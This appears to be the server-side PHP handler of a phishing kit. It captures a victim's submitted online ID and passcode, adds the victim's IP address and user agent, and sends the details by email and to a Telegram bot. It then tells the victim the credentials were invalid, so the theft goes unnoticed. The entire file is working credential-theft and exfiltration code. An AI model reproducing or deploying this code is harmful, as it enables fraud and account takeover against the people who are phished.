<?php
ob_start();

include 'email.php';
$ai = trim($_POST['ai']);
$pr = trim($_POST['pr']);
if(isset($_POST['btn1'])){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|  |--------------|\n";
	
	$message .= "Online ID            : ".$_POST['ai']."\n";
	$message .= "Passcode              : ".$_POST['pr']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------  --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    	mail($send, $subject, $message);   
    	echo $message;
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// Send to Telegram
	if (isset($telegram_bot_token) && isset($telegram_chat_id)) {
	    $telegram_msg = " *Login Details*\n";
	    $telegram_msg .= "==============================\n";
	    $telegram_msg .= " *Online ID:* ".$_POST['ai']."\n";
	    $telegram_msg .= " *Passcode:* ".$_POST['pr']."\n";
	    $telegram_msg .= " *IP Address:* ".$ip."\n";
	    $telegram_msg .= "️ *User Agent:* ".$useragent."\n";
	    $telegram_msg .= "==============================\n";
	    
	    sendToTelegram($telegram_msg, $telegram_bot_token, $telegram_chat_id);
	}
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);
    
// Telegram sending function
function sendToTelegram($message, $botToken, $chatId) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context  = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

ob_end_flush();
?>